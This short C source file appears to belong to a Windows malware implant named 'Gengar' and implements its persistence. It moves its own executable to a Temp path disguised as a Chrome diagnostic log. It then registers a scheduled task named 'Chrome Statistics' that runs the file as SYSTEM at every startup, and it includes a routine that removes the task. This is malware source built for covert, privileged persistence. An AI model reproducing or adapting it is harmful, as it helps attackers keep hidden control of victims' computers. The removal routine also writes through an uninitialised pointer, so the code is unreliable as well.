#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "shell.h"

#define TASK_NAME "Chrome Statistics"
#define GENGAR_PATH "C:\\Windows\\Temp\\ChromeDiagnose.log"

void hide_gengar() {
  char exe_path[1024];
  printf("Moving gengar to its path.\n");
  GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
  MoveFileA(exe_path, GENGAR_PATH);
}

void persist() {
  char cmd[1024];
  printf("Persisting Gengar.\n");
  hide_gengar();
  sprintf(cmd,
          "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN \"%s\" /TR \"%s\"",
          TASK_NAME, GENGAR_PATH);
  run(cmd);
}

void kill_gengar() {
  char* cmd;
  printf("Killing Gengar.\n");
  sprintf(cmd, "schtasks /Delete /F /TN %s", TASK_NAME);
  run(cmd);
  exit(1);
}
